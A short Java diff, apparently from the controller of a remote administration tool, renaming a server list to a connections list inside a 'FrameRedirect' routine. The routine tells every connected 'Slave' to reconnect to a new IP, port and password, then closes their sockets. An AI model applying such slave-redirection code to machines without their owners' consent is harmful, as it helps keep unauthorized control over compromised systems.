@@ -134,13 +134,13 @@ public class FrameRedirect extends BaseFrame {
 						frame.dispose();
 					}
 				} else {
-					for (Slave s : Main.servers) {
+					for (Slave s : Main.connections) {
 						s.addToSendQueue(new PacketBuilder(Header.REDIRECT, new String[] { txtIP.getText().trim(), spinnerPort.getValue().toString(), txtPass.getText().trim()}));								
 					}
 					
-					while (Main.servers.size() > 0) {
+					while (Main.connections.size() > 0) {
 						try {
-							Main.servers.get(0).closeSocket(new CloseException("Redirecting..."));
+							Main.connections.get(0).closeSocket(new CloseException("Redirecting..."));
 						} catch (Exception e1) {
 							e1.printStackTrace();
 						}
